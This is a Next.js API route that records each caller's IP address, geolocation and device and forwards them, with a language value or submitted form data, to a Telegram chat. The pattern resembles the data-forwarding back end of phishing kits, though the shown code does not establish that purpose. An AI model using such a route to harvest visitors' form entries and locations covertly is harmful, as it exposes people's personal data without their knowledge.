import { NextResponse } from "next/server";
import { extractClientIp, resolveLocation } from "@/lib/geo";
import { describeDevice } from "@/lib/device";
import { buildNotificationMessage } from "@/lib/notifyMessage";
import { sendTelegramMessage } from "@/lib/telegram";
import type { ClientFormData } from "@/lib/types";

export const dynamic = "force-dynamic";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const clientIp = extractClientIp(request);
    const locationData = await resolveLocation(clientIp);
    locationData.device = describeDevice(request.headers.get("user-agent"));

    if (body?.type === "language") {
      const language = body.language || "N/A";
      const text = `<b>IP:</b> <code>${locationData.ip}</code>\n<b>Location:</b> <code>${locationData.location}</code>\n<b>Device:</b> <code>${locationData.device}</code>\n<b>Language:</b> <code>${language}</code>`;
      const result = await sendTelegramMessage(text);
      return NextResponse.json(result);
    }

    const data = (body?.data || {}) as Partial<ClientFormData>;
    const text = buildNotificationMessage(data, locationData, true);
    const result = await sendTelegramMessage(text);
    return NextResponse.json(result);
  } catch (error) {
    console.error("Notify error:", error);
    return NextResponse.json({ ok: false, error: "notify_failed" }, { status: 500 });
  }
}
